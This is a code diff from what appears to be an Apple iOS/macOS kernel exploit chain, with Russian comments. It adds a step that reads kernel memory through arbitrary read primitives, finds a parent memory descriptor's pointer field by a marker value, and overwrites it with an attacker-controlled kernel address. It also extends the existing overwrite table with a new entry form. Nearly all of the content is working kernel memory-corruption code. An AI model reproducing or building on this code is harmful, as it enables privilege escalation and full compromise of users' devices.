@@ -6708,6 +6708,30 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 }
             }
         }
+        // 1.9.264: VA-FIELD по маркеру — в проигрышных бутах (258/259/262c) сериализатор
+        // идёт по ranges и ТРАНСЛИРУЕТ addr = VA бэкинга dst (р.65 Q3 + р.60 translator
+        // [0xaae20d0] vt+0x568). Ищем в родителе MD [pd+0x60] qword-поле, чьё содержимое
+        // = маркер backing dst (0x41544159) — это его kernel VA — и подменяем на
+        // phystokv(ctlPA): транслятор посчитает ctlPA сам. Третья цель за проход.
+        {
+            uint64_t parMD = pd247 ? kp_untag_ptr(early_kread64(pd247 + 0x60)) : 0;
+            uint64_t ctlKVA = (ctlPA && gPrimitives.phystokv) ? gPrimitives.phystokv(ctlPA) : 0;
+            if (kpLooksLikeKernelPointer(parMD) && kpSafeToRead(parMD) && ctlKVA) {
+                for (uint32_t o = 0; o + 8 <= 0x200 && nDep < 24; o += 8) {
+                    uint64_t F = kp_untag_ptr(early_kread64(parMD + o));
+                    if (!kpLooksLikeKernelPointer(F)) continue;
+                    uint64_t m = early_kread64(F);
+                    if ((uint32_t)m != 0x41544159) continue;
+                    kpNote(r, [NSString stringWithFormat:@"  [CHAIN] ★ VA-поле родителя +%#x: %#llx (контент=%#018llx) → ctlKVA %#llx",
+                              o, (unsigned long long)F, (unsigned long long)m, (unsigned long long)ctlKVA]);
+                    usleep(1500);
+                    early_kwrite64(parMD + o, ctlKVA);
+                    uint64_t rb = early_kread64(parMD + o);
+                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == ctlKVA ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    hitAddr[nDep] = parMD + o; hitOld[nDep] = F; hitForm[nDep] = 7; nDep++;
+                }
+            }
+        }
     }
     // 1.9.262: FAST-PATH — CHAIN вооружён (nDep>0) → прыгаем поверх всей
     // диагностической середины (зависание 262-го в SPC-fallback + окно мины):
@@ -7971,6 +7995,7 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
                         : (hitForm[i] == 3) ? (((uint64_t)ctlPFN << 32) | (hitOld[i] & 0xffffffffULL))
                         : (hitForm[i] == 5) ? ((hitOld[i] & 0xffffffff00000000ULL) | ctlPFN)
                         : (hitForm[i] == 6) ? ctlPA
+                        : (hitForm[i] == 7) ? (gPrimitives.phystokv ? gPrimitives.phystokv(ctlPA) : 0)
                         : (uint64_t)ctlPFN;
             early_kwrite64(hitAddr[i], nq);
         }
@@ -8203,6 +8228,7 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
                                     : (hitForm[i] == 4) ? ((hitOld[i] & 0xffffffff00000000ULL) | fPFN)
                                     : (hitForm[i] == 5) ? ((hitOld[i] & 0xffffffff00000000ULL) | fPFN)
                                     : (hitForm[i] == 6) ? pagePA
+                                    : (hitForm[i] == 7) ? (gPrimitives.phystokv ? gPrimitives.phystokv(pagePA) : 0)
                                     : (uint64_t)fPFN;
                         early_kwrite64(hitAddr[i], nq);
                     }
